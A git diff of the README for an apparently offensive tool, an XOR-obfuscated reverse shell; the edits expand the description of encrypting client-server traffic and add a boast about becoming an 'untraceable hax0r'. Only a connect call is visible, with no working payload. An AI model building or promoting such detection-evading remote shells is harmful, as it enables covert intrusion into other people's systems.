@@ -1,7 +1,7 @@
 [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
 ### Ciphered Reverse Shell using XOR
 
-By using pipes, vfork and execve its posible to manipulate interactively input and output of desired program.
+By using pipes, vfork and execve its posible to manipulate interactively input and output of desired program. So its posible to "encrypt" all the data transfered between client and server with a cihper algorithm like `XOR`.
 
 ### Building
 
@@ -24,6 +24,5 @@ if(Cli->Connect(HOST, PORT)){
 
 ```
 Save and build with `make client`.
-
-
-Now you are a untraceable hax0r :v
+Done!!!
+Now you have a `network encrypted` reverse shell and you turn yourself into an untraceable hax0r :v
